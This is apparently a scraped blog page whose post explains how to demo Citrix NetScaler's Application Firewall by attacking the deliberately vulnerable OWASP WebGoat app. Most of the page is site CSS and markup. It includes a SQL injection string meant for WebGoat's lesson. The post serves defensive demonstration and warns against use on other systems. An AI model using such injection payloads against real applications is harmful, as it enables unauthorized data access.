a{color:#606060;}input[type="text"],input[type="email"],input[type="url"],input[type="password"],input[type="search"],input[type="tel"],input[type="number"],textarea,select{color:#666666;background-color:#fafafa;border-color:#cccccc;}input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="number"]:focus,textarea:focus,select:focus{color:#666666;background-color:#ffffff;border-color:#bfbfbf;}button,html input[type="button"],input[type="reset"],input[type="submit"],a.button,a.wp-block-button__link:not(.has-background){color:#ffffff;background-color:#666666;}button:hover,html input[type="button"]:hover,input[type="reset"]:hover,input[type="submit"]:hover,a.button:hover,button:focus,html input[type="button"]:focus,input[type="reset"]:focus,input[type="submit"]:focus,a.button:focus,a.wp-block-button__link:not(.has-background):active,a.wp-block-button__link:not(.has-background):focus,a.wp-block-button__link:not(.has-background):hover{color:#ffffff;background-color:#3f3f3f;}a.generate-back-to-top{background-color:rgba( 0,0,0,0.4 );color:#ffffff;}a.generate-back-to-top:hover,a.generate-back-to-top:focus{background-color:rgba( 0,0,0,0.6 );color:#ffffff;}:root{--gp-search-modal-bg-color:var(--base-3);--gp-search-modal-text-color:var(--contrast);--gp-search-modal-overlay-bg-color:rgba(0,0,0,0.2);}@media (max-width:768px){.main-navigation .menu-bar-item:hover > a, .main-navigation .menu-bar-item.sfHover > a{background:none;color:#ffffff;}}.inside-header {padding-top: 40px; padding-right: 40px; padding-bottom: 40px; padding-left: 40px; }.separate-containers .inside-article, .separate-containers .comments-area, .separate-containers .page-header, .separate-containers .paging-navigation, .one-container .site-content {padding-top: 40px; padding-right: 40px; padding-bottom: 40px; padding-left: 40px; }.ignore-x-spacing {margin-right: -40px; margin-bottom: 40px; margin-left: -40px; }.ignore-xy-spacing {margin-top: -40px; margin-right: -40px; margin-bottom: 40px; margin-left: -40px; }.main-navigation .main-nav ul li a,			.menu-toggle {padding-left: 25px; padding-right: 25px; line-height: 50px; }.nav-float-right .main-navigation .main-nav ul li a {line-height: 50px; }.main-navigation .main-nav ul ul li a {padding-left: 25px; padding-right: 25px; padding-top: 10px; padding-bottom: 10px; }.main-navigation ul ul {top: 50px; }.navigation-search {height: 50px; line-height: 0px; }.navigation-search input {height: 50px; line-height: 0px; }.widget-area .widget {padding-top: 20px; padding-right: 20px; padding-bottom: 20px; padding-left: 20px; }.footer-widgets {padding-top: 40px; padding-right: 0px; padding-bottom: 40px; padding-left: 0px; }.site-info {padding-top: 20px; padding-right: 20px; padding-bottom: 20px; padding-left: 20px; }.right-sidebar.separate-containers .site-main {margin-top: 10px; margin-right: 10px; margin-bottom: 10px; margin-left: 0px; padding: 0px; }.left-sidebar.separate-containers .site-main {margin-top: 10px; margin-right: 0px; margin-bottom: 10px; margin-left: 10px; padding: 0px; }.both-sidebars.separate-containers .site-main {margin: 10px; padding: 0px; }.both-right.separate-containers .site-main {margin-top: 10px; margin-right: 10px; margin-bottom: 10px; margin-left: 0px; padding: 0px; }.separate-containers .site-main {margin-top: 10px; margin-bottom: 10px; padding: 0px; }.separate-containers .page-header-image, .separate-containers .page-header-content, .separate-containers .page-header-image-single, .separate-containers .page-header-content-single {margin-top: 10px; }.both-left.separate-containers .site-main {margin-top: 10px; margin-right: 0px; margin-bottom: 10px; margin-left: 10px; padding: 0px; }.separate-containers .inside-right-sidebar, .inside-left-sidebar {margin-top: 10px; margin-bottom: 10px; padding-top: 0px; padding-bottom: 0px; }.separate-containers .widget, .separate-containers .hentry, .separate-containers .page-header, .widget-area .main-navigation {margin-bottom: 10px; }.both-left.separate-containers .inside-left-sidebar {margin-right: 5px; padding-right: 0px; }.both-left.separate-containers .inside-right-sidebar {margin-left: 5px; padding-left: 0px; }.both-right.separate-containers .inside-left-sidebar {margin-right: 5px; padding-right: 0px; }.both-right.separate-containers .inside-right-sidebar {margin-left: 5px; padding-left: 0px; }@media (max-width:768px){.main-navigation .menu-toggle,.main-navigation .mobile-bar-items,.sidebar-nav-mobile:not(#sticky-placeholder){display:block;}.main-navigation ul,.gen-sidebar-nav{display:none;}[class*="nav-float-"] .site-header .inside-header > *{float:none;clear:both;}}
+.secondary-navigation {background-color: #636363; background-image: none; }.secondary-navigation ul ul {background-color: #303030; top: 40px; }.secondary-navigation ul li a,.secondary-navigation .menu-toggle {color: #FFFFFF; font-family: inherit; font-weight: normal; text-transform: none; font-size: 13px; padding-left: 20px; padding-right: 20px; line-height: 40px; background-image: none; }.secondary-navigation ul ul li a {color: #FFFFFF; font-size: 12px; padding-left: 20px; padding-right: 20px; padding-top: 10px; padding-bottom: 10px; background-image: none; }.secondary-navigation ul li > a:hover, .secondary-navigation ul li.sfHover > a {color: #FFFFFF; background-color: #303030; background-image: none; }.secondary-navigation ul ul li > a:hover, .secondary-navigation ul ul li.sfHover > a {color: #FFFFFF; background-color: #474747; background-image: none; }.secondary-navigation ul .current-menu-item > a, .secondary-navigation ul .current-menu-parent > a, .secondary-navigation ul .current-menu-ancestor > a, .secondary-navigation ul .current_page_item > a, .secondary-navigation ul .current_page_parent > a, .secondary-navigation ul .current_page_ancestor > a {color: #222222; background-color: #ffffff; background-image: none; }.secondary-navigation ul .current-menu-item > a:hover, .secondary-navigation ul .current-menu-parent > a:hover, .secondary-navigation ul .current-menu-ancestor > a:hover, .secondary-navigation ul .current_page_item > a:hover, .secondary-navigation ul .current_page_parent > a:hover, .secondary-navigation ul .current_page_ancestor > a:hover, .secondary-navigation ul .current-menu-item.sfHover > a, .secondary-navigation ul .current-menu-parent.sfHover > a, .secondary-navigation ul .current-menu-ancestor.sfHover > a, .secondary-navigation ul .current_page_item.sfHover > a, .secondary-navigation ul .current_page_parent.sfHover > a, .secondary-navigation ul .current_page_ancestor.sfHover > a {color: #222222; background-color: #ffffff; background-image: none; }.secondary-navigation ul ul .current-menu-item > a, .secondary-navigation ul ul .current-menu-parent > a, .secondary-navigation ul ul .current-menu-ancestor > a, .secondary-navigation ul ul .current_page_item > a, .secondary-navigation ul ul .current_page_parent > a, .secondary-navigation ul ul .current_page_ancestor > a {color: #FFFFFF; background-color: #474747; background-image: none; }.secondary-navigation ul ul .current-menu-item > a:hover, .secondary-navigation ul ul .current-menu-parent > a:hover, .secondary-navigation ul ul .current-menu-ancestor > a:hover, .secondary-navigation ul ul .current_page_item > a:hover, .secondary-navigation ul ul .current_page_parent > a:hover, .secondary-navigation ul ul .current_page_ancestor > a:hover,.secondary-navigation ul ul .current-menu-item.sfHover > a, .secondary-navigation ul ul .current-menu-parent.sfHover > a, .secondary-navigation ul ul .current-menu-ancestor.sfHover > a, .secondary-navigation ul ul .current_page_item.sfHover > a, .secondary-navigation ul ul .current_page_parent.sfHover > a, .secondary-navigation ul ul .current_page_ancestor.sfHover > a {color: #FFFFFF; background-color: #474747; background-image: none; }
+.inside-content-header {text-align: left; }.separate-containers .inside-article .page-header-below-title, .one-container .inside-article .page-header-below-title {margin-top: 2em; }.inside-article .page-header-post-image {float: none; margin-right: 0px; }
+</style>
+<link rel='stylesheet' id='generate-mobile-style-css' href='https://blogs.serioustek.net/wp-content/themes/generatepress/assets/css/mobile.min.css?ver=3.3.1' media='all' />
+<link rel='stylesheet' id='generate-font-icons-css' href='https://blogs.serioustek.net/wp-content/themes/generatepress/assets/css/components/font-icons.min.css?ver=3.3.1' media='all' />
+<link rel='stylesheet' id='font-awesome-css' href='https://blogs.serioustek.net/wp-content/themes/generatepress/assets/css/components/font-awesome.min.css?ver=4.7' media='all' />
+<style id='akismet-widget-style-inline-css'>
+
+			.a-stats {
+				--akismet-color-mid-green: #357b49;
+				--akismet-color-white: #fff;
+				--akismet-color-light-grey: #f6f7f7;
+
+				max-width: 350px;
+				width: auto;
+			}
+
+			.a-stats * {
+				all: unset;
+				box-sizing: border-box;
+			}
+
+			.a-stats strong {
+				font-weight: 600;
+			}
+
+			.a-stats a.a-stats__link,
+			.a-stats a.a-stats__link:visited,
+			.a-stats a.a-stats__link:active {
+				background: var(--akismet-color-mid-green);
+				border: none;
+				box-shadow: none;
+				border-radius: 8px;
+				color: var(--akismet-color-white);
+				cursor: pointer;
+				display: block;
+				font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen-Sans', 'Ubuntu', 'Cantarell', 'Helvetica Neue', sans-serif;
+				font-weight: 500;
+				padding: 12px;
+				text-align: center;
+				text-decoration: none;
+				transition: all 0.2s ease;
+			}
+
+			/* Extra specificity to deal with TwentyTwentyOne focus style */
+			.widget .a-stats a.a-stats__link:focus {
+				background: var(--akismet-color-mid-green);
+				color: var(--akismet-color-white);
+				text-decoration: none;
+			}
+
+			.a-stats a.a-stats__link:hover {
+				filter: brightness(110%);
+				box-shadow: 0 4px 12px rgba(0, 0, 0, 0.06), 0 0 2px rgba(0, 0, 0, 0.16);
+			}
+
+			.a-stats .count {
+				color: var(--akismet-color-white);
+				display: block;
+				font-size: 1.5em;
+				line-height: 1.4;
+				padding: 0 13px;
+				white-space: nowrap;
+			}
+		
+</style>
+<link rel='stylesheet' id='blog-styles-css' href='https://blogs.serioustek.net/wp-content/plugins/gp-premium/addons/generate-blog/inc/css/style.css?ver=6.7.2' media='all' />
+<script src="https://blogs.serioustek.net/wp-content/plugins/google-analytics-dashboard-for-wp/assets/js/frontend-gtag.min.js?ver=8.4.1" id="exactmetrics-frontend-script-js" async data-wp-strategy="async"></script>
+<script data-cfasync="false" data-wpfc-render="false" id='exactmetrics-frontend-script-js-extra'>var exactmetrics_frontend = {"js_events_tracking":"true","download_extensions":"zip,mp3,mpeg,pdf,docx,pptx,xlsx,rar","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/blogs.serioustek.net","hash_tracking":"false","v4_id":"G-3RQX76N9PK"};</script>
+<script src="https://blogs.serioustek.net/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://blogs.serioustek.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<link rel="https://api.w.org/" href="https://blogs.serioustek.net/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://blogs.serioustek.net/wp-json/wp/v2/posts/990" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blogs.serioustek.net/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.7.2" />
+<link rel="canonical" href="https://blogs.serioustek.net/post/2016/03/22/demo-netscaler-app-firewall" />
+<link rel='shortlink' href='https://wp.me/p6oGOe-fY' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://blogs.serioustek.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblogs.serioustek.net%2Fpost%2F2016%2F03%2F22%2Fdemo-netscaler-app-firewall" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://blogs.serioustek.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblogs.serioustek.net%2Fpost%2F2016%2F03%2F22%2Fdemo-netscaler-app-firewall&#038;format=xml" />
+	<style>img#wpstats{display:none}</style>
+		<link rel="pingback" href="https://blogs.serioustek.net/xmlrpc.php">
+
+<!-- Jetpack Open Graph Tags -->
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Demo NetScaler App Firewall (WAF)" />
+<meta property="og:url" content="https://blogs.serioustek.net/post/2016/03/22/demo-netscaler-app-firewall" />
+<meta property="og:description" content="Ever want to try out the feature of the NetScaler known as Application Firewall (AppFW or simply WAF)? Or maybe you need to demo NetScaler App Firewall for one of your customers, but are not sure o…" />
+<meta property="article:published_time" content="2016-03-22T13:35:59+00:00" />
+<meta property="article:modified_time" content="2021-04-26T19:21:39+00:00" />
+<meta property="og:site_name" content="SeriousTek" />
+<meta property="og:image" content="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup-300x191.png" />
+<meta property="og:image:width" content="300" />
+<meta property="og:image:height" content="191" />
+<meta property="og:image:alt" content="WGSetup" />
+<meta property="og:locale" content="en_US" />
+<meta name="twitter:text:title" content="Demo NetScaler App Firewall (WAF)" />
+<meta name="twitter:image" content="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup-300x191.png?w=640" />
+<meta name="twitter:image:alt" content="WGSetup" />
+<meta name="twitter:card" content="summary_large_image" />
+
+<!-- End Jetpack Open Graph Tags -->
+<style id="sccss">.site-branding {
+      display: inline-block;
+}
+
+.site-logo {
+      float: left;
+      margin-right: 10px;
+      margin-top: 5px;
+}</style></head>
+
+<body class="post-template-default single single-post postid-990 single-format-standard wp-custom-logo wp-embed-responsive post-image-below-header post-image-aligned-center secondary-nav-above-header secondary-nav-aligned-right both-sidebars nav-below-header separate-containers contained-header active-footer-widgets-3 nav-aligned-center header-aligned-left dropdown-hover" itemtype="https://schema.org/Blog" itemscope>
+	<a class="screen-reader-text skip-link" href="#content" title="Skip to content">Skip to content</a>		<header class="site-header grid-container grid-parent" id="masthead" aria-label="Site"  itemtype="https://schema.org/WPHeader" itemscope>
+			<div class="inside-header grid-container grid-parent">
+							<div class="header-widget">
+				<aside id="lsi_widget-3" class="widget inner-padding widget_lsi_widget"><h2 class="widget-title">Follow me</h2><ul class="lsi-social-icons icon-set-lsi_widget-3" style="text-align: right"><li class="lsi-social-twitter"><a class="" rel="nofollow noopener noreferrer" title="Twitter" aria-label="Twitter" href="https://twitter.com/JRutski/" target="_blank"><i class="lsicon lsicon-twitter"></i></a></li><li class="lsi-social-linkedin"><a class="" rel="nofollow noopener noreferrer" title="LinkedIn" aria-label="LinkedIn" href="https://www.linkedin.com/pub/jacob-rutski/69/668/766" target="_blank"><i class="lsicon lsicon-linkedin"></i></a></li><li class="lsi-social-gplus"><a class="" rel="nofollow noopener noreferrer" title="Google+" aria-label="Google+" href="https://plus.google.com/u/0/111570273641376461575" target="_blank"><i class="lsicon lsicon-gplus"></i></a></li><li class="lsi-social-facebook"><a class="" rel="nofollow noopener noreferrer" title="Facebook" aria-label="Facebook" href="https://facebook.com/jake.rutski" target="_blank"><i class="lsicon lsicon-facebook"></i></a></li><li class="lsi-social-rss"><a class="" rel="nofollow noopener noreferrer" title="RSS" aria-label="RSS" href="https://blogs.serioustek.net/feed/" target="_blank"><i class="lsicon lsicon-rss"></i></a></li><li class="lsi-social-email"><a class="" rel="nofollow" title="Contact" aria-label="Contact" href="/cdn-cgi/l/email-protection#d9b3b8b2bc99aabcabb0b6acaaadbcb2f7b7bcad"><i class="lsicon lsicon-email"></i></a></li></ul></aside>			</div>
+			<div class="site-branding">
+						<p class="main-title" itemprop="headline">
+					<a href="https://blogs.serioustek.net/" rel="home">
+						SeriousTek
+					</a>
+				</p>
+						<p class="site-description" itemprop="description">
+					Virtualization, EUC, and Computing in General
+				</p>
+					</div><div class="site-logo">
+					<a href="https://blogs.serioustek.net/" rel="home">
+						<img  class="header-image is-logo-image" alt="SeriousTek" src="https://blogs.serioustek.net/wp-content/uploads/2015/06/logo1.png" />
+					</a>
+				</div>			</div>
+		</header>
+				<nav class="main-navigation grid-container grid-parent sub-menu-right" id="site-navigation" aria-label="Primary"  itemtype="https://schema.org/SiteNavigationElement" itemscope>
+			<div class="inside-navigation grid-container grid-parent">
+								<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
+					<span class="mobile-menu">Menu</span>				</button>
+						<div id="primary-menu" class="main-nav">
+			<ul class="menu sf-menu">
+				<li class="page_item page-item-542"><a href="https://blogs.serioustek.net/blogs">Blog</a></li>
+<li class="page_item page-item-544"><a href="https://blogs.serioustek.net/vcenter-documentation">vCenter Documentation Script</a></li>
+<li class="page_item page-item-546"><a href="https://blogs.serioustek.net/powershell">PowerShell</a></li>
+<li class="page_item page-item-796"><a href="https://blogs.serioustek.net/storefront-configurator">Citrix Storefront Configurator</a></li>
+			</ul>
+		</div>
+					</div>
+		</nav>
+		
+	<div class="site grid-container container hfeed grid-parent" id="page">
+				<div class="site-content" id="content">
+			
+	<div class="content-area grid-parent mobile-grid-100 push-15 grid-60 tablet-push-15 tablet-grid-60" id="primary">
+		<main class="site-main" id="main">
+			
+<article id="post-990" class="post-990 post type-post status-publish format-standard hentry category-appfirewall category-citrix category-netscaler tag-appfirewall tag-application-firewall tag-citrix tag-netscaler" itemtype="https://schema.org/CreativeWork" itemscope>
+	<div class="inside-article">
+		<div class="page-header-image-single grid-container grid-parent generate-page-header"><img width="480" height="216" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/NSLogo.png" class="attachment-full size-full" alt="" decoding="async" fetchpriority="high" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/NSLogo.png 480w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NSLogo-300x135.png 300w" sizes="(max-width: 480px) 100vw, 480px" /></div>			<header class="entry-header" aria-label="Content">
+				<h1 class="entry-title" itemprop="headline">Demo NetScaler App Firewall (WAF)</h1>		<div class="entry-meta">
+			<span class="posted-on"><time class="updated" datetime="2021-04-26T19:21:39+00:00" itemprop="dateModified">April 26, 2021</time><time class="entry-date published" datetime="2016-03-22T13:35:59+00:00" itemprop="datePublished">March 22, 2016</time></span> <span class="byline">by <span class="author vcard" itemprop="author" itemtype="https://schema.org/Person" itemscope><a class="url fn n" href="https://blogs.serioustek.net/post/author/jacobrutski" title="View all posts by Jacob Rutski" rel="author" itemprop="url"><span class="author-name" itemprop="name">Jacob Rutski</span></a></span></span> 		</div>
+					</header>
+			
+		<div class="entry-content" itemprop="text">
+			<p>Ever want to try out the feature of the NetScaler known as Application Firewall (AppFW or simply WAF)? Or maybe you need to demo NetScaler App Firewall for one of your customers, but are not sure of the best way to show it off? Well, that&#8217;s understandable because App Firewall is powerful and demoing it can be a bit tricky. In this post I&#8217;ll cover two of the biggest hurdles in showing off AppFW:</p>
+<ol>
+<li>Working knowledge of web exploits is hard to come by unless you are a developer (or have experience&#8230;hacking websites&#8230;)</li>
+<li>Attempting malicious interaction with a production web server is probably frowned upon</li>
+</ol>
+<h3>*NOTE* This guide goes through some simple, example code that can be used in a malicious manner. <span style="text-decoration: underline;"><strong>DO NOT </strong></span> under any circumstances use these methods on a production environment or anyone else&#8217;s environment. Period. Also note that these scenarios are specific to the Web Goat excercises &#8211; if you want to learn more about how they work, this is not the place to do that. And lastly note that I will not be held responsible for anything you do &#8211; you&#8217;re on your own 🙂</h3>
+<h3>Setting up Your Environment</h3>
+<p>To demo App Firewall successfully, you&#8217;ll need a few things:</p>
+<ul>
+<li>A platinum NetScaler platform license (don&#8217;t have one? Use a free evaluation license from <a href="http://store.citrix.com/store/citrix/en_US/cat/ThemeID.33753000/categoryID.63401700" target="_blank" rel="noopener">the Citrix Store</a>)</li>
+<li>A web server (this guide will show using Windows Server 2008R2, but any system capable of running JVM should work)</li>
+<li>A poorly written web application</li>
+</ul>
+<p>You may be wondering why we need a poorly written web application &#8211; in this case, it helps to demo several of the protection features in WAF as well as being a safe sandbox for trying out web exploits. We&#8217;ll be using the <a href="https://www.owasp.org/index.php/Category:OWASP_WebGoat_Project" target="_blank" rel="noopener">OWASP Web Goat</a> server for this &#8211; I like this tool because it includes guidance on how to perform several of the exploits if you are not familiar with them. I am going to go through a few of the very simple and easy to demonstrate exercises with Web Goat but be aware that there are several more and should all work with the App Firewall.</p>
+<p><strong>Step 1: </strong>Setup the web server to be protected by App Firewall</p>
+<p>First we need to setup Web Goat &#8211; the simplest way (<a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">easy run instructions</a>) to get this going is to run it in JVM, so go download at least <strong>JDK version 1.7</strong> <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk7-downloads-1880260.html" target="_blank" rel="noopener">from Oracle.</a> Once installed, you will need to download the easy run executable jar file <a href="https://s3.amazonaws.com/webgoat-war/webgoat-container-7.0.1-war-exec.jar" target="_blank" rel="noopener">from here</a> &#8211; put it somewhere easy to remember.</p>
+<p>Next, run the following command:</p>
+<pre>java -jar webgoat-container-7.0.1-war-exec.jar</pre>
+<p>At this point, the web server should be running at the following address http://localhost:8080/WebGoat &#8211; be sure to check your firewall if you are not able to access the page externally.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup.png"><img decoding="async" class="alignnone wp-image-993 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup-300x191.png" alt="WGSetup" width="300" height="191" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup-300x191.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup-768x488.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/WGSetup.png 1021w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Once on the page, you can login with guest\guest to get started.</p>
+<p><strong>Step 2:</strong> Get the server configured on the NetScaler</p>
+<p><em>*Note: all configuration examples are using NetScaler 11 &#8211; older builds may be slightly different, but functionality is mostly the same</em></p>
+<p>Create a server and service for the Web Goat server on the NetScaler &#8211; as this is just for demo\testing purposes, the TCP-default monitor is fine. Don&#8217;t forget that Web Goat is running on port 8080.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1.png"><img decoding="async" class="alignnone wp-image-994 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1-300x77.png" alt="NS1" width="300" height="77" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1-300x77.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1-768x198.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1-1024x263.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS1.png 1069w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Then we need to create an <strong>HTTP</strong> <strong>load balancing vServer</strong> for Web Goat &#8211; we&#8217;ll be translating port 80 to 8080, so no need to remember the &#8216;:8080&#8217; each time.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-995 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2-300x150.png" alt="NS2" width="300" height="150" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2-300x150.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2-768x385.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2-1024x513.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/NS2.png 1067w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>You should now be able to login to WebGoat using http://&lt;vServer IP&gt;/WebGoat</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGLogin.png"><img loading="lazy" decoding="async" class="alignnone wp-image-996 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGLogin-300x225.png" alt="WGLogin" width="300" height="225" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/WGLogin-300x225.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/WGLogin-768x577.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/WGLogin.png 829w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p><strong>Step 3: </strong>Get App Firewall configured on the NetScaler</p>
+<p>I&#8217;m not going to cover basic NetScaler configuration, but you don&#8217;t really need much to demo this stuff. If you have not already, enable the Application Firewall feature on the NetScaler. Next, we are going to create a copy of the Default Signatures &#8211; App Firewall uses both a <strong>positive and a negative security model</strong> &#8211; this is the &#8216;negative&#8217; or &#8216;blacklist&#8217; model.</p>
+<p>Under Security &gt; Application Firewall &gt; Signatures : highlight <strong>*Default Signatures</strong> and select &#8216;Add&#8217; &#8211; give the new signatures a name, leave the defaults set, and save.</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures.png"><img loading="lazy" decoding="async" class="alignnone wp-image-997 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures-300x208.png" alt="Signatures" width="300" height="208" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures-300x208.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures-768x533.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures-1024x710.png 1024w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Signatures.png 1348w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>Highlight the newly created signature set then go to Action &gt; Auto Update Settings &#8211; ensure auto update is enabled with an update URL of:</p>
+<pre>https://s3.amazonaws.com/NSAppFwSignatures/SignaturesMapping.xml</pre>
+<p>Now, manually update the signatures using the <strong>Update Version</strong> button. <strong>*</strong><strong>Note:</strong> The NetScaler must have internet access and have DNS configured for the update to work.</p>
+<p>Next, create a new Application Firewall Profile by going to Security &gt; Application Firewall &gt; Profiles &#8211; then select <strong>Add</strong>. Give the profile a name, then select <strong>Web 2.0 Application </strong>and leave defaults set to <strong>Basic. </strong>Once created, highlight the newly added Profile and select <strong>Edit</strong> &#8211; then choose <strong>Profile Settings</strong> &#8211; in the &#8216;Bound Signatures&#8217; field, select the previously created Signature set, then select <strong>OK. </strong>Set <strong>Strip HTML Comments</strong> to <strong>All.</strong></p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Settings.png"><img loading="lazy" decoding="async" class="alignnone wp-image-998 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Settings-272x300.png" alt="Settings" width="272" height="300" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Settings-272x300.png 272w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Settings-768x848.png 768w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Settings.png 916w" sizes="auto, (max-width: 272px) 100vw, 272px" /></a></p>
+<p>Additionally, make sure that the following <strong>Security Checks </strong>are set to block (with Start URL set to Learn)</p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/SecurityChecks2.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1005 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/SecurityChecks2-237x300.png" alt="" width="237" height="300" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/SecurityChecks2-237x300.png 237w, https://blogs.serioustek.net/wp-content/uploads/2016/03/SecurityChecks2.png 582w" sizes="auto, (max-width: 237px) 100vw, 237px" /></a></p>
+<p>The last part of the initial NetScaler configuration is to create an App Firewall policy and bind it to the Web Goat LB vServer. To do this, go to Security &gt; Application Firewall &gt; Policies &gt; Firewall &#8211; and select <strong>Add</strong>. Give the policy a name and select the previously created AppFW Profile (AppFW_Profile_Demo in the below screenshot). For the expression, we are going to match all traffic, so use this:</p>
+<pre>HTTP.REQ.IS_VALID</pre>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Policy.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1000 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Policy-300x253.png" alt="Policy" width="300" height="253" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Policy-300x253.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Policy.png 623w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>To bind the policy, we will use the <strong>Policy Manager</strong> by choosing a bind point of &#8216;Load Balancing Virtual Server&#8217; and selecting the previously created virtual server &#8211; select the policy that was created and leave all <strong>Binding Details</strong> at default settings.</p>
+<p><img loading="lazy" decoding="async" class="alignnone size-medium wp-image-1001" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/PolManager-275x300.png" alt="PolManager" width="275" height="300" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/PolManager-275x300.png 275w, https://blogs.serioustek.net/wp-content/uploads/2016/03/PolManager.png 535w" sizes="auto, (max-width: 275px) 100vw, 275px" /></p>
+<p>The last step is to <strong>Disable the Application Firewall feature</strong> &#8211; why you ask? Well, part of the demo is showing what happens when we use malicious code to break in to our vulnerable website, so for now we are going to disable App Firewall so that we can show what these site attacks look like. <em>*Note: we will be disabling\enabling AppFW between the different attacks, so get used to doing it. The easiest way is to simply disable the feature directly from the navigation column as shown below.</em></p>
+<p><a href="https://blogs.serioustek.net/wp-content/uploads/2016/03/Disable.png"><img loading="lazy" decoding="async" class="alignnone wp-image-1002 size-medium" src="https://blogs.serioustek.net/wp-content/uploads/2016/03/Disable-300x300.png" alt="Disable" width="300" height="300" srcset="https://blogs.serioustek.net/wp-content/uploads/2016/03/Disable-300x300.png 300w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Disable-150x150.png 150w, https://blogs.serioustek.net/wp-content/uploads/2016/03/Disable.png 599w" sizes="auto, (max-width: 300px) 100vw, 300px" /></a></p>
+<p>As we go through each of the different attacks on Web Goat the order of operations will be:</p>
+<ul>
+<li>Ensure that AppFW is disabled</li>
+<li>Try the attack, verify it is working</li>
+<li>Reset the lesson in WebGoat</li>
+<li>Enable AppFW</li>
+<li>Re-test the attack, verify it no longer works</li>
+<li>Check for audit logs on the NetScaler</li>
+<li>Repeat</li>
+</ul>
+<h3>Demo 1: HTML SQL Injection</h3>
+<p>Login to Web Goat &#8211; from the navigation menu, choose <strong>Injection Flaws &gt; </strong><strong>String SQL Injection. </strong>(Ensure AppFW is disabled) In the form field, type the following string <strong>exactly</strong> as you see it &#8211; the single quotes are important:</p>
+<pre>Erwin' OR '1'='1</pre>
+<p>If you are confused, you can always check the &#8216;Solution&#8217; at the top of the page in Web Goat. If the SQL Injection attack was successful, you should see all the results from the query as follows:</p>
